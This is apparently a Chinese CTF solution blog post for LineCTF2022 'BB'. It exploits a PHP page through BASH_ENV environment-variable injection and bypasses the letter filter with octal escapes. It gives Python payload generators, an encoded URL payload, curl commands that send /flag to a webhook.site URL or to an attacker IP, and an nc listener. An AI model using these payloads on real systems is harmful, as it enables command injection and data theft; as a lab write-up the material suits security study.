---
title: '[LineCTF2022]BB'
date: 2024-11-29 20:36:47
tags: 
      - shell反弹
      - curl
categories: 刷题笔记
---

## [LineCTF2022]BB

```php
<?php
    error_reporting(0);

    function bye($s, $ptn){
        if(preg_match($ptn, $s)){
            return false;
        }
        return true;
    }

    foreach($_GET["env"] as $k=>$v){
        if(bye($k, "/=/i") && bye($v, "/[a-zA-Z]/i")) {
            putenv("{$k}={$v}");
        }
    }
    system("bash -c 'imdude'");
    
    foreach($_GET["env"] as $k=>$v){
        if(bye($k, "/=/i")) {
            putenv("{$k}");
        }
    }
    highlight_file(__FILE__);
?>
```

我们利用环境变量注入

[参考网站](https://tttang.com/archive/1450/#toc_0x06-bash_env)

使$k=BASH_ENV

$v=【攻击命令，如cat /flag | curl -d @- [http://xx.xx.xx.xx:7001](http://xx.xx.xx.xx:7001/)(攻击机ip)】



##  绕过大小写过滤：

在linux中，$'\101' = A，故可以用[八进制](https://so.csdn.net/so/search?q=八进制&spm=1001.2101.3001.7020)（即0o101=A）来绕过。



## exp1

我们向指定的webhook站点发送一个post请求，并上传了一个名为flag的文件

```
curl https://webhook.site/a27433a-afdb-9d9a080beb55 -F flag=@/flag
```

这个命令的具体含义如下

curl 是一个命令行工具，用于在终端中传输数据，支持多种协议

https://webhook.site/a27433a-afdb-9d9a080beb55 是一个webhook站点的url，其中包含一个唯一的标识符

-F @/flag  这是命令的参数，其中-F表示要发送一个表单数据，flag=@/flag意味着要上传一个名为flag的文件

```
from urllib.parse import quote_plus
 
cmd = b"curl https://webhook.site/a278d63fdb-9d9a080beb55 -F flag=@/flag"
parts = cmd.split(b' ')
cmd = ["$'"+''.join([f'\\{x:03o}' for x in p])+"'" for p in parts]
cmd = ' '.join(cmd)
 
payload = "$(%s)" % cmd
print(payload)
print(quote_plus(payload))
```

payload

```
?env[BASH_ENV]=%24%28%24%27%5C143%5C165%5C162%5C154%27+%24%27%5C150%5C164%5C164%5C160%5C163%5C072%5C057%5C057%5C167%5C145%5C142%5C150%5C157%5C157%5C153%5C056%5C163%5C151%5C164%5C145%5C057%5C062%5C065%5C063%5C066%5C064%5C145%5C070%5C061%5C055%5C145%5C142%5C065%5C146%5C055%5C064%5C142%5C145%5C144%5C055%5C142%5C144%5C144%5C070%5C055%5C145%5C146%5C060%5C071%5C065%5C064%5C062%5C066%5C071%5C062%5C067%5C060%27+%24%27%5C055%5C106%27+%24%27%5C146%5C154%5C141%5C147%5C075%5C100%5C057%5C146%5C154%5C141%5C147%27%29


```

我们在webhook得到了一个flag文件

![image-20241129211829831](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411292118924.png)

下载下来，打开得到flag



## exp2

我们可以通过反弹shell的方式

先监听端口 

```
nc -lvvp [端口号]
```

```python
import string
 
# cmd = "cat /flag"
cmd = "cat /flag | curl -d @- http://xx.xx.xx.xx:7001" #（攻击机ip）
str = ''
for i in cmd:
    if i in string.ascii_lowercase:
        j = oct(ord(i))[2:]
        str += "$'\\"+j+"'"
    else:
        str+=i
 
print(str)
```

再将结果拼接到url上如：

```
?env[BASH_ENV]=$'\143'$'\141'$'\164' /$'\146'$'\154'$'\141'$'\147' | $'\143'$'\165'$'\162'$'\154' -$'\144' @- $'\150'$'\164'$'\164'$'\160'://xx.xx.xx.xx:7001

```

运行要是没问题的话就能得到flag

## 官方wp

https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/
